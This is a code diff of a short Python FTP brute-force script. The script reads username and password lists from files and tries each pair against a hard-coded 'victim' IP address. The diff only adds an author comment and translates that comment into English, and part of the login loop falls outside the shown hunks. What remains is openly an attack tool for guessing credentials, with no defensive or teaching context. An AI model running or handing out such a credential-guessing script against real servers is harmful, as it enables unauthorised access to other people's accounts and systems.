@@ -1,5 +1,7 @@
 import ftplib
 
+#Created by ivancabrera02
+
 def brute(ip,usuario,password):
 	ftp = ftplib.FTP(ip)
 	try:
@@ -10,7 +12,7 @@ def brute(ip,usuario,password):
 		print('No hubo conexion')
 
 def main():
-	ip = "192.168.0.2"  #aqui IP victima
+	ip = "192.168.0.2"  #Ip here
 	usuarios = open('usuarios.txt','r')
 	usuarios = usuarios.read().split('\n')
 	passwords = open('contrasenas.txt','r')
